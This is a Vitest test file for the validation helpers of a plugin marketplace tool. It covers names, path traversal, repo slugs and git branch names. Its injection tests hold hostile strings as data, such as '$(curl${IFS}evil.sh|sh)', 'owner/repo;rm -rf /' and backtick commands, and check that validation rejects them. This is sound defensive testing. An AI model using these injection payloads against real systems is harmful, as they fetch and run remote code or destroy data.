import { describe, it, expect } from "vitest";
import { join } from "path";
import {
  validatePluginName,
  validateMarketplaceName,
  validateItemName,
  validateRepoSlug,
  validateGitRef,
  safePath,
} from "./validation.js";

const BASE = join("/tmp", "blackbook-validate");

describe("validation helpers", () => {
  it("accepts valid names", () => {
    expect(() => validatePluginName("valid-name_1")).not.toThrow();
    expect(() => validateMarketplaceName("market_01")).not.toThrow();
    expect(() => validateItemName("skill", "skill.name")).not.toThrow();
  });

  it("rejects invalid names", () => {
    expect(() => validatePluginName("../bad")).toThrow();
    expect(() => validateMarketplaceName("bad/name")).toThrow();
    expect(() => validateItemName("skill", ".")).toThrow();
    expect(() => validateItemName("command", "..")).toThrow();
  });

  it("safePath rejects traversal and dots", () => {
    expect(() => safePath(BASE, "../evil")).toThrow();
    expect(() => safePath(BASE, "a/b")).toThrow();
    expect(() => safePath(BASE, ".")).toThrow();
  });

  it("safePath allows normal segments", () => {
    const path = safePath(BASE, "valid");
    expect(path).toContain("valid");
  });

  describe("validateRepoSlug", () => {
    it("accepts realistic GitHub owner/repo slugs", () => {
      expect(() => validateRepoSlug("owner/repo")).not.toThrow();
      expect(() => validateRepoSlug("owner/repo.name")).not.toThrow();
      expect(() => validateRepoSlug("owner/repo-name_with.various-chars")).not.toThrow();
      expect(() => validateRepoSlug("EveryInc/compound-engineering-plugin")).not.toThrow();
    });

    it("rejects repo slugs carrying shell metacharacters (command injection)", () => {
      // These are the values a malicious marketplace URL would smuggle into a
      // subprocess argv; validation must throw before any spawn happens.
      expect(() => validateRepoSlug("$(touch /tmp/pwned-marker-file)/x")).toThrow();
      expect(() => validateRepoSlug("`touch /tmp/pwned`/x")).toThrow();
      expect(() => validateRepoSlug("owner/repo;rm -rf /")).toThrow();
      expect(() => validateRepoSlug("owner/repo|sh")).toThrow();
      expect(() => validateRepoSlug("owner/repo&&curl evil.sh")).toThrow();
      expect(() => validateRepoSlug("$(curl${IFS}evil.sh|sh)/x")).toThrow();
    });

    it("rejects malformed slugs (wrong shape, traversal)", () => {
      expect(() => validateRepoSlug("owner")).toThrow();
      expect(() => validateRepoSlug("owner/repo/extra")).toThrow();
      expect(() => validateRepoSlug("../owner/repo")).toThrow();
      expect(() => validateRepoSlug("owner/..")).toThrow();
      expect(() => validateRepoSlug("")).toThrow();
    });
  });

  describe("validateGitRef (branch names)", () => {
    it("accepts common branch names, including slashed refs", () => {
      expect(() => validateGitRef("main")).not.toThrow();
      expect(() => validateGitRef("master")).not.toThrow();
      expect(() => validateGitRef("feature/foo")).not.toThrow();
      expect(() => validateGitRef("release-1.2.3")).not.toThrow();
    });

    it("rejects branch names carrying shell metacharacters or traversal", () => {
      expect(() => validateGitRef("$(touch /tmp/pwned-marker-file)")).toThrow();
      expect(() => validateGitRef("`id`")).toThrow();
      expect(() => validateGitRef("main;rm -rf /")).toThrow();
      expect(() => validateGitRef("main|sh")).toThrow();
      expect(() => validateGitRef("has space")).toThrow();
      expect(() => validateGitRef("../evil")).toThrow();
    });
  });
});
